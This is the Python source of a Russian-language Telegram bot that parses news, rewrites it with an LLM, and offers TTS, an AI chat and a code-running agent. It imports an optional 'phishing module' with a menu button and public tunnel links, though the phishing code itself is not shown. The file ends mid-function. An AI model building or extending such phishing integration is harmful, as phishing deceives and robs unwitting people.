#!/usr/bin/env python3
"""
bot.py — АВТОМУВИ v2.4 | ИИ чат + агент-кодер + inline UI + Фишинг модуль
"""

import time, threading, schedule, os, subprocess, re, shutil
from database import init_db, get_stats, get_today_count
from news_parser import parse_all
from pipeline import run_pipeline
from telegram_client import (
    get_updates, send_message, answer_callback,
    edit_message, delete_webhook, send_document, download_file
)
from file_agent import analyze_file, get_dest_path, UPLOADS_DIR
from llm_checker import check_all, format_check_results, check_provider, RECOMMENDED
from model_discovery import discover_all, save_cache, load_cache, get_models, get_free_openrouter, format_discovery_report, CACHE_FILE
from model_discovery import (
    get_openrouter_models_cached, fetch_ollama_models,
    fetch_any_provider_models, format_models_summary, format_free_models_keyboard
)
from tts_engine import list_russian_voices, eleven_list_voices
from llm_client import test_connection, check_all_providers
import config
from promts import STYLES, TTS_LANGUAGES
from updater import (check_dependencies, upgrade_core,
                     get_bot_info, format_deps_report, format_bot_info,
                     install_package)
from image_gen  import generate_image, get_available_providers as get_image_providers
from msg_sender import (send_to_user, send_to_channel, send_file_to, send_photo_to,
                        forward_message, schedule_message, get_scheduled, broadcast)

from chat_agent import (
    start_session, end_session, get_session, is_active, session_info,
    chat_respond, code_agent_run, format_code_result, all_active_sessions
)

# ── Auth модуль (капча + регистрация + логин) ────────────────────
try:
    import auth_module
    auth_module.init_auth_db()
    AUTH_MOD = True
    print("  ✅ auth_module загружен", flush=True)
except Exception as _am_e:
    AUTH_MOD = False
    print(f"  ⚠️ auth_module не загружен: {_am_e}", flush=True)

# ── Фишинг-модуль (опционально — не падает если зависимости отсутствуют) ──
try:
    import fish_bot_state
    import fish_db
    from fish_downloader import downloader as fish_downloader
    import fish_utils
    import fish_config as _fish_cfg
    FISH_ENABLED = True
except ImportError as _fe:
    FISH_ENABLED = False
    print(f"  ⚠️ Фишинг-модуль не загружен: {_fe}", flush=True)

# ── Auth / Session / Sandbox / Agent v2 ─────────────────────────
try:
    import auth as _auth
    from session import sessions as _sessions
    from tool_registry import registry as _tool_registry
    from tool_builtin import register_all as _register_tools
    from agent_v2 import run_agent as _run_agent
    from sandbox import execute_code as _exec_code, format_result as _fmt_code
    _register_tools()
    _auth.init_db()
    AUTH_ENABLED = True
    print("  ✅ Auth + Session + Agent v2 загружены", flush=True)
except Exception as _ae:
    AUTH_ENABLED = False
    print(f"  ⚠️ Auth/Agent v2 не загружены: {_ae}", flush=True)

# ── Состояния авторизации ────────────────────────────────────────
_auth_wait = {}   # chat_id -> 'register_pass' | 'login_pass' | 'setkey_provider' | 'setkey_value'
_auth_data  = {}  # chat_id -> dict промежуточных данных

# ── Состояния ожидания ввода (chat_id -> ключ состояния) ──────
_wait_state = {}  # обычный dict, без аннотации типов — совместимо с Python 3.7+
_yt_pending_url = {}  # chat_id → URL пока пользователь выбирает формат
_fm_cache = {}        # короткий id → полный путь (обход лимита 64б кнопок Telegram)
_img_settings = {}    # chat_id → {size, style_suffix}
_pending_agent_task = {}  # chat_id -> {'task': str, 'mode': 'chat'|'code'}
_pending_file       = {}  # chat_id -> {'path': str, 'filename': str, 'analysis': str}
_fish_user_data     = {}  # chat_id -> {'file_id': int}  — для фишинг-сессий
_fish_user_opts     = {}  # chat_id -> options dict
_task_lock = threading.Lock()
_tg_user_cache = {}   # chat_id -> {username, first_name} — кэш из апдейтов


# ══════════════════════════════════════════════════════════════
#  СТРОИТЕЛИ КЛАВИАТУР
# ══════════════════════════════════════════════════════════════

def kb(*rows):
    """Собирает InlineKeyboardMarkup из рядов кнопок."""
    return {"inline_keyboard": list(rows)}

def btn(text, data):
    """Одна inline-кнопка."""
    return {"text": text, "callback_data": data}

def back_btn(dest="menu"):
    return btn("◀️ Назад", dest)


def menu_keyboard():
    return kb(
        [btn("🚀 Запустить цикл",    "run"),
         btn("📡 Только парсинг",    "parse")],
        [btn("🤖 ИИ Агент",          "menu_agent"),
         btn("🎨 Картинки",          "menu_image")],
        [btn("🧠 LLM / Провайдер",   "menu_llm"),
         btn("📨 Отправка",          "menu_send")],
        [btn("🎭 Стиль / Промт",     "menu_style"),
         btn("🎙 TTS",               "menu_tts")],
        [btn("🎣 Фишинг",            "menu_fish"),
         btn("🔍 Окружение",         "env")],
        [btn("🔄 Обновление",        "menu_update"),
         btn("🩺 Диагностика",        "selfcheck")],
        [btn("⚙️ Обработать",         "process"),
         btn("❓ Справка",           "help")],
        [btn("👤 Регистрация / Вход", "menu_auth"),
         btn("🤖 AI Агент v2",       "menu_agent_v2")],
    )


def style_keyboard():
    current = _get_env_style()
    rows = []
    keys = list(STYLES.keys())
    for i in range(0, len(keys), 2):
        pair = keys[i:i+2]
        row = []
        for k in pair:
            s = STYLES[k]
            mark = " ✅" if k == current else ""
            row.append(btn("{} {}{}".format(s['emoji'], s['name'], mark), "style:{}".format(k)))
        rows.append(row)
    rows.append([btn("✏️ Задать свой промт", "set_custom_prompt")])
    rows.append([back_btn()])
    return kb(*rows)


def tts_keyboard():
    provider = (config.TTS_PROVIDER or 'edge').lower().strip()
    edge_mark = " ✅" if provider == 'edge' else ""
    eleven_mark = " ✅" if provider != 'edge' else ""
    return kb(
        [btn("edge-tts (бесплатно){}".format(edge_mark), "tts_prov:edge"),
         btn("ElevenLabs{}".format(eleven_mark),          "tts_prov:elevenlabs")],
        [btn("🌍 Язык озвучки (edge)",  "menu_lang")],
        [btn("🎙 Сменить голос",        "set_voice")],
        [btn("📋 Список голосов",       "voices")],
        [back_btn()],
    )


def lang_keyboard():
    current = (os.environ.get('TTS_LANGUAGE', 'ru') or 'ru').lower()
    rows = []
    keys = list(TTS_LANGUAGES.keys())
    for i in range(0, len(keys), 2):
        pair = keys[i:i+2]
        row = []
        for k in pair:
            l = TTS_LANGUAGES[k]
            mark = " ✅" if k == current else ""
            row.append(btn("{}{}".format(l['name'], mark), "lang:{}".format(k)))
        rows.append(row)
    rows.append([back_btn("menu_tts")])
    return kb(*rows)


def llm_keyboard():
    cur = config.LLM_PROVIDER.lower().strip()
    def lbl(name, key):
        mark = " ✅" if cur == key else ""
        return btn("{}{}".format(name, mark), "llm_info:{}".format(key))
    return kb(
        # ── Бесплатные / условно-бесплатные ─────────────
        [lbl("⚡ Groq (free)",     "groq"),    lbl("🤖 Ollama (local)",  "ollama")],
        [lbl("💎 Gemini (free)",   "gemini"),  lbl("🌐 OpenRouter (free)","openrouter")],
        [lbl("🧠 Cerebras (fast)", "cerebras"),lbl("🔥 SambaNova",       "sambanova")],
        # ── Платные ──────────────────────────────────────
        [lbl("🔵 OpenAI",          "openai"),  lbl("🟣 Claude",          "claude")],
        [lbl("🐋 DeepSeek",        "deepseek"),lbl("🟡 Mistral",         "mistral")],
        [lbl("✖ xAI/Grok",        "xai"),     lbl("🌙 Kimi",            "kimi")],
        [lbl("🦙 Llama API",       "llama"),   lbl("🌊 Cohere",          "cohere")],
        # ── Все остальные ────────────────────────────────
        [btn("📋 Все провайдеры",  "llm_all_providers")],
        # ── Действия ─────────────────────────────────────
        [btn("🔑 Добавить API ключ","llm_add_key"),
         btn("✏️ Ввести вручную",   "set_llm")],
        [btn("🔍 Проверить все",     "llm_check"),
         btn("🆓 Бесплатные",        "llm_free")],
        [btn("🧪 Тест текущего",    "test"),
         btn("🔄 Выбрать модель",   "llm_pick_current")],
        [back_btn()],
    )

def project_mode_keyboard():
    """Выбор режима генерации проекта перед стартом."""
    return kb(
        [btn("🧩 Двухэтапный план",    "proj_mode:plan")],
        [btn("📄 Один файл за раз",    "proj_mode:onebyone")],
        [btn("🏗 Скаффолдер-скрипт",  "proj_mode:scaffold")],
        [btn("❌ Отмена",              "proj_mode:cancel")],
    )


def agent_keyboard(chat_id=None):
    """Подменю ИИ-агента."""
    active = is_active(chat_id) if chat_id else False
    info = session_info(chat_id) if active else None
    rows = []
    if active and info:
        mode_label = "💬 Чат" if info['mode'] == 'chat' else "💻 Кодер"
        rows.append([btn("🟢 Сессия: {} | {} сообщ. | {}".format(
            mode_label, info['messages'], info['elapsed']), "agent_status")])
        rows.append([btn("🔴 Завершить сессию", "agent_end")])
    else:
        rows.append([btn("💬 ИИ-чат",           "agent_chat_start"),
                     btn("💻 Агент-кодер",       "agent_code_start")])
    rows.append([btn("🎬 YouTube → MP3/MP4",   "agent_youtube_start")])
    rows.append([btn("📁 Файловый менеджер",   "fm:open:~")])
    rows.append([btn("🔧 Инструменты бота",    "agent_tools_menu")])
    rows.append([btn("ℹ️ Как пользоваться",   "agent_help")])
    rows.append([back_btn()])
    return kb(*rows)


def after_file_keyboard():
    """Что делать с файлом после анализа."""
    return kb(
        [btn("🔍 Найти ошибки",        "file_action:review"),
         btn("🔧 Исправить ошибки",    "file_action:fix")],
        [btn("📖 Объяснить код",       "file_action:explain"),
         btn("🚀 Улучшить/расширить",  "file_action:improve")],
        [btn("🏗 Создать на основе",    "file_action:build"),
         btn("✏️ Свой запрос",         "file_action:custom")],
        [btn("🔴 Закрыть",             "file_action:close")],
    )


def chat_control_keyboard(mode='chat'):
    """Кнопки управления внутри ИИ-сессии."""
    rows = [
        [btn("🗑 Очистить историю", "agent_clear"),
         btn("🔴 Завершить",        "agent_end")],
        [btn("📊 Статус сессии",   "agent_status"),
         btn("◀️ Главное меню",    "menu")],
    ]
    if mode == 'chat':
        rows.insert(1, [
            btn("🌐 Поиск в сети",   "chat_fn:websearch"),
            btn("📁 Мои файлы",      "fm:open:~"),
        ])
        rows.insert(2, [
            btn("🔧 Инструменты",    "agent_tools_menu"),
            btn("🎭 Сменить роль",   "chat_fn:persona"),
        ])
    return kb(*rows)




# ══════════════════════════════════════════════════════════════
#  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ══════════════════════════════════════════════════════════════

def _get_env_style():
    return os.environ.get('REWRITE_STYLE', 'troll').lower().strip()


def _update_env(key, value):
    """Пишет в .env и сразу обновляет os.environ — без перезапуска."""
    path = config.ENV_PATH
    try:
        lines = []
        if os.path.exists(path):
            with open(path, 'r') as f:
                lines = f.readlines()
        updated = False
        for i, line in enumerate(lines):
            if line.startswith('{}='.format(key)):
                lines[i] = '{}={}\n'.format(key, value)
                updated = True
                break
        if not updated:
            lines.append('{}={}\n'.format(key, value))
        with open(path, 'w') as f:
            f.writelines(lines)
        os.environ[key] = value
        print("  💾 .env: {}={}{}".format(
            key, value[:30], '...' if len(value) > 30 else ''), flush=True)
    except Exception as e:
        print("  ⚠️ .env update error: {}".format(e), flush=True)


def _run_in_thread(fn, *args):
    def wrapper():
        with _task_lock:
            try:
                fn(*args)
            except Exception as e:
                import traceback as _tb
                print("❌ Thread error: {}".format(e), flush=True)
                print(_tb.format_exc()[:500], flush=True)
    threading.Thread(target=wrapper, daemon=True).start()


def _current_status_text():
    try:
        total, sent = get_stats()
        today = get_today_count()
    except Exception:
        total, sent, today = '?', '?', '?'

    provider = (config.TTS_PROVIDER or 'edge').lower().strip()
    style_key = _get_env_style()
    style_info = STYLES.get(style_key, {})
    style_name = "{} {}".format(style_info.get('emoji', ''), style_info.get('name', style_key))

    lang_key = os.environ.get('TTS_LANGUAGE', 'ru')
    lang_name = TTS_LANGUAGES.get(lang_key, {}).get('name', lang_key)

    if provider in ('eleven', 'elevenlabs', '11labs'):
        voice = config.ELEVEN_VOICE_ID or '(не задан)'
        tts_line = "ElevenLabs | {}".format(voice)
    else:
        tts_line = "edge-tts | {} | {}".format(lang_name, config.TTS_VOICE)

    return (
        "🤖 <b>АВТОМУВИ</b>\n\n"
        "📦 В базе: {} | Сегодня: {} | Отправлено: {}\n"
        "🧠 {} / {}\n"
        "🎙 {}\n"
        "🎭 Стиль: {}\n"
        "⏰ Авто-парсинг каждые {}ч"
    ).format(
        total, today, sent,
        config.LLM_PROVIDER, config.LLM_MODEL,
        tts_line,
        style_name,
        config.PARSE_INTERVAL_HOURS
    )


# ══════════════════════════════════════════════════════════════
#  ЗАДАЧИ (выполняются в фоновом потоке)
# ══════════════════════════════════════════════════════════════

def task_parse(chat_id):
    send_message("📡 Парсю новости...", chat_id)
    n = parse_all()
    send_message("✅ Новых новостей: <b>{}</b>".format(n), chat_id)

def task_process(chat_id):
    send_message("⚙️ Обрабатываю накопленные новости...", chat_id)
    n = run_pipeline()
    send_message("✅ Обработано: <b>{}</b>".format(n), chat_id)

def task_run(chat_id):
    send_message("🚀 Полный цикл запущен...", chat_id)
    new = parse_all()
    send_message("📡 Спарсено: <b>{}</b>\n⚙️ Обрабатываю...".format(new), chat_id)
    done = run_pipeline()
    total, sent = get_stats()
    send_message(
        "✅ Цикл завершён!\n"
        "🆕 Новых: {} | ⚙️ Обработано: {}\n"
        "📦 В базе: {} | 📤 Отправлено: {}".format(new, done, total, sent),
        chat_id)

def task_check_providers(chat_id):
    send_message("🔍 Проверяю все провайдеры параллельно...", chat_id)
    results = check_all_providers(dict(os.environ))
    report = format_check_results(results)
    # Предлагаем переключиться на рабочий провайдер
    ok_providers = [r['provider'] for r in results if r['ok']]
    markup = None
    if ok_providers:
        btns = [btn("→ {}".format(p), "llm_info:{}".format(p)) for p in ok_providers[:4]]
        rows = [btns[i:i+2] for i in range(0, len(btns), 2)]
        rows.append([btn("◀️ Назад", "menu_llm")])
        markup = kb(*rows)
    send_message(report, chat_id, reply_markup=markup)


def task_test(chat_id):
    send_message(
        "🧪 Тестирую LLM...\n"
        "Провайдер: <b>{}</b>\n"
        "Модель: <b>{}</b>".format(config.LLM_PROVIDER, config.LLM_MODEL),
        chat_id)
    ok, msg = test_connection()
    send_message("{} Результат:\n{}".format('✅' if ok else '❌', msg[:400]), chat_id)

def task_voices(chat_id):
    provider = (config.TTS_PROVIDER or 'edge').lower().strip()
    send_message("🎙 Загружаю список голосов (provider={})...".format(provider), chat_id)
    try:
        if provider in ('eleven', 'elevenlabs', '11labs'):
            voices = eleven_list_voices()
            lines = ["• {} — <code>{}</code>".format(v['name'], v['voice_id']) for v in voices[:25]]
            send_message("🎙 <b>Голоса ElevenLabs:</b>\n\n" + "\n".join(lines), chat_id)
        else:
            import asyncio
            import edge_tts as _etts
            all_v = asyncio.run(_etts.list_voices())
            lang_key = os.environ.get('TTS_LANGUAGE', 'ru').lower()
            lang_voices = [v for v in all_v if v.get('Locale', '').lower().startswith(lang_key)][:25]
            lines = ["• <code>{}</code>".format(v['ShortName']) for v in lang_voices]
            send_message(
                "🎙 <b>Голоса edge-tts ({}):</b>\n\n".format(lang_key.upper()) +
                "\n".join(lines) +
                "\n\n<i>Скопируй ShortName → 🎙 Сменить голос</i>",
                chat_id)
    except Exception as e:
        send_message("❌ Ошибка: {}".format(e), chat_id)


# ══════════════════════════════════════════════════════════════
#  ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ
# ══════════════════════════════════════════════════════════════

def _handle_agent_message(chat_id, text, mode):
    """Обрабатывает сообщение внутри активной ИИ-сессии."""
    if mode == 'chat':
        send_message("⏳ Думаю...", chat_id)
        try:
            reply = chat_respond(chat_id, text)
        except Exception as e:
            reply = "❌ Ошибка: {}".format(e)
        send_message(reply[:4000], chat_id, reply_markup=chat_control_keyboard())

    elif mode == 'code':
        from chat_agent import _is_project_task, _is_scaffold_task
        is_proj = _is_project_task(text) or _is_scaffold_task(text)

        if is_proj:
            # Показываем выбор режима перед стартом
            _pending_agent_task[chat_id] = {'task': text}
            send_message(
                "🗂 <b>Проектная задача обнаружена.</b>\n\n"
                "Выбери режим генерации:\n\n"
                "🧩 <b>Двухэтапный план</b> — сначала список файлов (JSON), потом каждый файл отдельно. "
                "Лучший баланс качества и скорости.\n\n"
                "📄 <b>Один файл за раз</b> — без плана, сразу генерирует файлы по очереди. "
                "Быстрее, но менее структурировано.\n\n"
                "🏗 <b>Скаффолдер-скрипт</b> — LLM пишет один Python-скрипт который сам создаёт "
                "все файлы и пакует в zip. Самый компактный вариант.",
                chat_id,
                reply_markup=project_mode_keyboard()
            )
        else:
            _run_code_task(chat_id, text, proj_mode=None)


def _run_code_task(chat_id, text, proj_mode=None):
    """Запускает агент-кодер, отправляет вывод по частям, собирает zip."""

    def on_status(msg):
        send_message(msg, chat_id)

    result = code_agent_run(chat_id, text, on_status=on_status, proj_mode=proj_mode)
    formatted = format_code_result(result)

    # Шапка с кодом (может быть длинной — режем на 4096)
    _send_chunked(chat_id, formatted)

    # Полный вывод скрипта — отправляем по частям без обрезания
    full_output = result.get('_full_output', '')
    sent_chunks = []
    if full_output and full_output != '(нет вывода)':
        label = "Результат:" if result.get('success') else "Ошибка:"
        header = "<b>{}:</b>\n<pre>".format(label)
        footer = "</pre>"
        chunk_size = 4000 - len(header) - len(footer)

        lines = full_output.splitlines(keepends=True)
        current = ""
        part = 1
        total_parts = max(1, (len(full_output) + chunk_size - 1) // chunk_size)

        for line in lines:
            if len(current) + len(line) > chunk_size:
                chunk_text = header + _esc(current.rstrip()) + footer
                if total_parts > 1:
                    chunk_text += " <i>({}/{})</i>".format(part, total_parts)
                send_message(chunk_text, chat_id)
                sent_chunks.append(current)
                current = line
                part += 1
            else:
                current += line

        if current.strip():
            chunk_text = header + _esc(current.rstrip()) + footer
            if total_parts > 1:
                chunk_text += " <i>({}/{})</i>".format(part, total_parts)
            send_message(chunk_text, chat_id)
            sent_chunks.append(current)

    # Файлы созданные агентом
    files = result.get('files', [])
    task_type = result.get('_task_type', '')

    # ── Специальная обработка для video-агента ──────────────────────
    if task_type == 'video':
        if full_output:
            send_message(full_output, chat_id)

        if files:
            fpath = files[0]
            if os.path.exists(fpath):
                fsize_mb = result.get('_fsize_mb', 0)
                fmt      = result.get('_video_fmt', 'mp4')
                title    = result.get('_video_title', os.path.basename(fpath))
                icon     = '🎵' if fmt == 'mp3' else '🎬'
                caption  = "{} {} ({:.1f} MB)".format(icon, title, fsize_mb)

                tg_limit = 49
                if fsize_mb <= tg_limit:
                    send_message("📤 Отправляю файл...", chat_id)
                    try:
                        send_document(fpath, caption=caption, chat_id=chat_id)
                    except Exception as e:
                        send_message("⚠️ Не удалось отправить через Telegram: {}\n"
                                     "Попробуй скачать по туннельной ссылке.".format(e), chat_id)
                else:
                    send_message(
                        "⚠️ Файл {:.1f} MB — слишком большой для Telegram API (лимит ~50 MB).\n"
                        "Файл сохранён локально: <code>{}</code>".format(
                            fsize_mb, os.path.basename(fpath)), chat_id)

                # Туннельная ссылка для крупных файлов или как доп. вариант
                try:
                    import fish_bot_state as _fbs
                    tunnel_url = (_fbs.tunnel_url or _fbs.bore_url or
                                  _fbs.ngrok_url or _fbs.serveo_url)
                    if tunnel_url:
                        send_message(
                            "🌍 Также доступен через туннель:\n"
                            "<code>{}/download/{}</code>".format(
                                tunnel_url.rstrip('/'),
                                os.path.basename(fpath)), chat_id)
                except Exception:
                    pass
            else:
                send_message("❌ Файл не найден на диске.", chat_id)
        elif not result.get('success'):
            pass  # ошибка уже показана через _full_output / on_status

        send_message("✅ Готово", chat_id, reply_markup=chat_control_keyboard())
        return

    # ── Специальная обработка для file-агента ──────────────────────
    if task_type == 'file':
        # Сводка уже в _full_output — показываем её
        if full_output:
            send_message(full_output, chat_id)

        # Отправляем каждый файл
        if files:
            send_message("📎 <b>Отправляю файлы ({} шт.)...</b>".format(len(files)), chat_id)
            for fpath in files:
                if os.path.exists(fpath) and os.path.isfile(fpath):
                    try:
                        ext = os.path.splitext(fpath)[1].lower()
                        icons = {'.txt':'📄','.md':'📝','.csv':'📊',
                                 '.docx':'📃','.zip':'📦','.rar':'📦'}
                        icon = icons.get(ext, '📎')
                        caption = "{} {}".format(icon, os.path.basename(fpath))
                        send_document(fpath, caption=caption, chat_id=chat_id)
                    except Exception as e:
                        send_message("⚠️ Не удалось отправить {}: {}".format(
                            os.path.basename(fpath), e), chat_id)

        # Туннельная ссылка — если файлы доступны через веб-сервер
        try:
            import fish_bot_state as _fbs
            tunnel_url = _fbs.tunnel_url or _fbs.bore_url or _fbs.ngrok_url or _fbs.serveo_url
            if tunnel_url:
                send_message(
                    "🌍 Файлы также доступны через туннель:\n"
                    "<code>{}</code>".format(tunnel_url),
                    chat_id)
        except Exception:
            pass

        send_message("✅ Готово", chat_id, reply_markup=chat_control_keyboard())
        return

    # ── Стандартная обработка (скрипты, проекты) ──────────────────
    all_items = list(files)
    zip_to_send = None

    if sent_chunks or files:
        import zipfile as _zf, time as _time
        ts = _time.strftime('%H%M%S')
        zip_dir = os.path.join(
            os.path.dirname(os.path.abspath(__file__)), 'agent_projects', 'results'
        )
        os.makedirs(zip_dir, exist_ok=True)
        zip_path = os.path.join(zip_dir, 'result_{}.zip'.format(ts))

        with _zf.ZipFile(zip_path, 'w', _zf.ZIP_DEFLATED) as zf:
            code = result.get('code', '')
            if code:
                zf.writestr('script.py', code)
            if full_output:
                zf.writestr('output.txt', full_output)
            for fpath in files:
                if os.path.exists(fpath):
                    zf.write(fpath, os.path.basename(fpath))
        zip_to_send = zip_path

    if files:
        send_message("📎 <b>Отправляю файлы ({} шт.)...</b>".format(len(files)), chat_id)
        for fpath in files:
            if os.path.exists(fpath) and os.path.isfile(fpath):
                try:
                    send_document(fpath, caption="📄 {}".format(os.path.basename(fpath)), chat_id=chat_id)
                except Exception as e:
                    send_message("⚠️ {}".format(e), chat_id)

    if zip_to_send and os.path.exists(zip_to_send):
        send_message("📦 <b>Итоговый архив (код + вывод + файлы):</b>", chat_id)
        send_document(zip_to_send, caption="📦 result.zip", chat_id=chat_id)

    send_message("✅ Готово", chat_id, reply_markup=chat_control_keyboard())


def _send_chunked(chat_id, text, chunk_size=4096):
    """Отправляет длинный текст по частям."""
    if not text.strip():
        return
    for i in range(0, len(text), chunk_size):
        send_message(text[i:i+chunk_size], chat_id)


def _esc(text):
    import html
    return html.escape(str(text))


def _show_quick_provider(chat_id):
    """Быстрая смена провайдера — показывает кнопки топ-провайдеров."""
    from llm_checker import RECOMMENDED

    # Популярные провайдеры с рекомендуемыми моделями
    QUICK = [
        ('mistral',   'mistral-small-latest',          'Mistral Small'),
        ('groq',      'llama-3.3-70b-versatile',       'Groq Llama-3.3'),
        ('deepseek',  'deepseek-chat',                 'DeepSeek V3'),
        ('openrouter','deepseek/deepseek-chat:free',   'OpenRouter Free'),
        ('gemini',    'gemini-2.0-flash',              'Gemini Flash'),
        ('openai',    'gpt-4o-mini',                   'GPT-4o Mini'),
        ('cerebras',  'llama-3.3-70b',                 'Cerebras Fast'),
        ('ollama',    'llama3.2',                      'Ollama Local'),
    ]

    rows = []
    for provider, model, label in QUICK:
        active = "✅ " if config.LLM_PROVIDER == provider else ""
        rows.append([btn("{}{}".format(active, label), "quickllm:{}:{}".format(provider, model))])

    rows.append([btn("🔍 Все провайдеры", "llm_check"), btn("🔄 Обновить", "llm_discover")])
    rows.append([btn("✏️ Вручную /setllm", "noop")])

    send_message(
        "🧠 <b>Смена провайдера</b>\n"
        "Текущий: <b>{} / {}</b>\n\n"
        "Быстрый выбор (ключи берутся из .env автоматически):".format(
            config.LLM_PROVIDER, config.LLM_MODEL),
        chat_id, reply_markup=kb(*rows)
    )


def handle_text(text, chat_id):
    # ── AUTH MODULE: перехватываем ВСЁ если не авторизован ───────
    if AUTH_MOD:
        step, _ = auth_module.auth_state_get(chat_id)
        if step != "idle":
            # Пользователь в процессе регистрации/логина/капчи
            auth_module.auth_handle_text(chat_id, text)
            return
        if not auth_module.is_authenticated(chat_id):
            # Не авторизован и не в процессе — запускаем флоу
            udata = _tg_user_cache.get(chat_id, {})
            auth_module.auth_start(chat_id,
                username=udata.get('username'),
                first_name=udata.get('first_name'))
            return

    # ── Auth wait states (приоритет над остальными) ────────────
    if chat_id in _auth_wait and AUTH_ENABLED:
        auth_state = _auth_wait.pop(chat_id)
        if _handle_auth_wait(auth_state, text.strip(), chat_id):
            return

    # Режим ожидания ввода от пользователя
    if chat_id in _wait_state:
        state = _wait_state.pop(chat_id)
        _handle_input(state, text.strip(), chat_id)
        return

    stripped = text.strip()
    cmd = stripped.split()[0].lower()

    # Если активна ИИ-сессия — все сообщения (кроме /end, /menu) уходят в агент
    if is_active(chat_id) and not cmd in ('/endchat', '/end', '/menu', '/start', '/help', '/provider', '/llm', '/модель'):
        sess = get_session(chat_id)
        mode = sess['mode'] if sess else 'chat'
        _handle_agent_message(chat_id, stripped, mode)
        return

    if cmd in ('/start', '/menu', '/help'):
        send_message(_current_status_text(), chat_id, reply_markup=menu_keyboard())
    elif cmd == '/logout' and AUTH_MOD:
        auth_module.auth_session_delete(chat_id)
        auth_module.auth_state_clear(chat_id)
        send_message("👋 Ты вышел из аккаунта.\n\nОтправь любое сообщение чтобы войти снова.", chat_id)
        sess = auth_module.auth_session_get(chat_id)
    elif cmd == '/whoami' and AUTH_MOD:
        sess = auth_module.auth_session_get(chat_id)
        if sess:
            user = auth_module.get_user(chat_id)
            attempts = user.get('login_attempts', 0) if user else 0
            send_message(
                "\U0001f464 <b>\u0410\u043a\u043a\u0430\u0443\u043d\u0442</b>\n\n"
                "\u041b\u043e\u0433\u0438\u043d: <code>{}</code>\n"
                "Telegram ID: <code>{}</code>\n"
                "\u041f\u043e\u043f\u044b\u0442\u043e\u043a \u0432\u0445\u043e\u0434\u0430: {}\n"
                "\n/logout \u2014 \u0432\u044b\u0439\u0442\u0438".format(
                    sess.get("login", "?"), chat_id, attempts),
                chat_id)
        else:
            send_message("\u274c \u041d\u0435 \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u043e\u0432\u0430\u043d", chat_id)
    elif cmd == '/run':
        _guard_lock(chat_id) or _run_in_thread(task_run, chat_id)
    elif cmd == '/parse':
        _guard_lock(chat_id) or _run_in_thread(task_parse, chat_id)
    elif cmd == '/process':
        _guard_lock(chat_id) or _run_in_thread(task_process, chat_id)
    elif cmd == '/test':
        _run_in_thread(task_test, chat_id)
    elif cmd == '/voices':
        _run_in_thread(task_voices, chat_id)
    elif cmd == '/stats':
        send_message(_current_status_text(), chat_id, reply_markup=menu_keyboard())
    elif cmd == '/env':
        _show_env(chat_id)
    elif cmd.startswith('/setprompt'):
        parts = text.strip().split(maxsplit=1)
        if len(parts) < 2:
            _wait_state[chat_id] = 'custom_prompt'
            send_message("✏️ Введи новый системный промт:", chat_id)
        else:
            _apply_custom_prompt(parts[1], chat_id)
    elif cmd.startswith('/llm'):
        # /llm — быстрая смена провайдера интерактивно
        parts = text.split()
        if len(parts) == 1:
            # Показываем текущий + меню
            from llm_checker import RECOMMENDED
            cur_p = config.LLM_PROVIDER
            cur_m = config.LLM_MODEL
            providers = list(RECOMMENDED.keys())
            rows = []
            for i in range(0, len(providers), 3):
                row = [btn(('✅ ' if providers[j] == cur_p else '') + providers[j],
                           'llm_pick:{}'.format(providers[j]))
                       for j in range(i, min(i+3, len(providers)))]
                rows.append(row)
            rows.append([back_btn("menu_llm")])
            send_message(
                'Текущий: <b>{}</b> / <code>{}</code>\n\nВыбери провайдера:'.format(cur_p, cur_m),
                chat_id, reply_markup=kb(*rows)
            )
        elif len(parts) >= 2:
            # /llm groq  или  /llm groq llama-3.3-70b  или  /llm groq model key
            provider = parts[1].lower()
            from llm_checker import RECOMMENDED
            rec = RECOMMENDED.get(provider, [])
            model = parts[2] if len(parts) >= 3 else (rec[0] if rec else config.LLM_MODEL)
            api_key = parts[3] if len(parts) >= 4 else ''
            config.set_llm(provider, model, api_key)
            send_message(
                '✅ Провайдер: <b>{}</b>\nМодель: <code>{}</code>'.format(provider, model),
                chat_id)

    elif cmd == '/fix':
        _wait_state[chat_id] = 'fix_input'
        send_message(
            "🔧 <b>Исправление ошибок</b>\n\nОтправь код + текст ошибки.\n"
            "Агент сам найдёт и исправит (до 6 попыток).",
            chat_id, reply_markup=kb([btn("❌ Отмена", "cancel_wait")]))
    elif cmd == '/analyze':
        _wait_state[chat_id] = 'analyze_input'
        send_message(
            "🔍 <b>Анализ кода</b>\n\nОтправь код — получишь детальный разбор.",
            chat_id, reply_markup=kb([btn("❌ Отмена", "cancel_wait")]))
    elif cmd.startswith('/setllm'):
        parts = text.strip().split()
        if len(parts) >= 3:
            _apply_llm(parts[1], parts[2], parts[3] if len(parts) > 3 else None, chat_id)
        else:
            _wait_state[chat_id] = 'llm'
            send_message(
                "🧠 Введи LLM в формате: <code>провайдер модель [api_key]</code>\n\n"
                "Примеры:\n"
                "<code>ollama llama3.2</code>\n"
                "<code>gemini gemini-2.0-flash MY_KEY</code>\n"
                "<code>openai gpt-4o-mini MY_KEY</code>",
                chat_id)
    elif cmd.startswith('/setvoice'):
        parts = text.strip().split(maxsplit=1)
        if len(parts) >= 2:
            _apply_voice(parts[1].strip(), chat_id)
        else:
            _wait_state[chat_id] = 'voice'
            send_message("🎙 Введи ShortName голоса (из /voices):", chat_id)
    elif cmd in ('/chat', '/ai', '/агент'):
        start_session(chat_id, 'chat')
        send_message(
            "💬 <b>ИИ-чат активирован!</b>\n\n"
            "Просто пиши сообщения — я отвечу.\n"
            "Модель: <b>{} / {}</b>\n\n"
            "<i>Кнопки для управления ниже 👇</i>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            chat_id, reply_markup=chat_control_keyboard()
        )
    elif cmd in ('/code', '/кодер', '/coder'):
        start_session(chat_id, 'code')
        send_message(
            "💻 <b>Агент-кодер v4</b>\n"
            "Модель: <b>{} / {}</b>\n\n"
            "Умеет:\n"
            "• Писать и запускать Python-код\n"
            "• Создавать Telegram-ботов и приложения\n"
            "• Генерировать изображения (Pillow, QR)\n"
            "• Анализировать код и находить баги\n"
            "• Исправлять ошибки авто-итерациями\n"
            "• Анализировать файлы и архивы\n\n"
            "<i>Пришли код + 'найди ошибки' — разберу.\n"
            "Пришли код + traceback + 'исправь' — починю.\n"
            "Просто опиши задачу — напишу.</i>".format(config.LLM_PROVIDER, config.LLM_MODEL),
            chat_id, reply_markup=chat_control_keyboard()
        )

    elif cmd in ('/provider', '/llm', '/модель'):
        # Быстрая смена провайдера
